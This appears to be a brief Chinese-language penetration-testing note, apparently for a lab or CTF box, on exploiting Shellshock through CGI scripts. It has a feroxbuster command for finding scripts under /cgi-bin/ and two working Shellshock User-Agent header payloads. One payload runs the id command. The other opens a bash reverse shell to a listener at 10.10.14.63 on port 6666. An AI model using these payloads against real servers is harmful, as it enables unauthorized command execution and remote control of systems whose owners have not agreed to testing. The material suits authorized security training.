# cgi（shellshock）

先nikto放着然后开始手动测试

1. 扫目录

```bash
feroxbuster -u http://10.129.12.37/cgi-bin/ -x sh,cgi,pl
如果能扫到，就说明可以shellshock来搞
```

```bash
User-Agent: () { :;}; echo; /usr/bin/id
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.63/6666 0>&1
```
